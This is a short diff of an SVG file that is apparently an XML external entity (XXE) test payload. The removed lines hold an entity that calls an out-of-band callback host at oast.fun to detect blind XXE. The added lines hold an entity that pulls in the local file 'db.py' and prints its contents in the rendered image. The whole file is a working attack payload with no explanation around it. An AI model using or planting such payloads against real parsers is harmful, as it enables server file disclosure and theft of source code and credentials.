@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg [
-  <!ENTITY ping SYSTEM "http://yasdobiozbvepfrkmthvvhmuyvraksf3n.oast.fun/">
+  <!ENTITY test SYSTEM "db.py">
 ]>
-<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">
-  <text>&ping;</text>
+<svg xmlns="http://www.w3.org/2000/svg" width="300" height="100">
+  <text x="10" y="20" font-size="12">&test;</text>
 </svg>
